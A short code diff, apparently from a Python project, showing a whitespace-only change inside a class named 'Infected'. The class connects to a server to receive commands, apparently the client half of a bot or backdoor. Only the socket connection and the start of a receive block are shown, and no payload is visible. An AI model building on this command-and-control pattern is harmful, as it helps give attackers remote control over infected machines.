@@ -21,7 +21,7 @@ class Infected:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
             # Connect the socket to the port where the server is listening
             server_address = (self.ipServer, self.portReceiveCommand)
-            sock.connect(server_address)      
+            sock.connect(server_address)  
             print("Conection")      
             try:
                 # Receive action
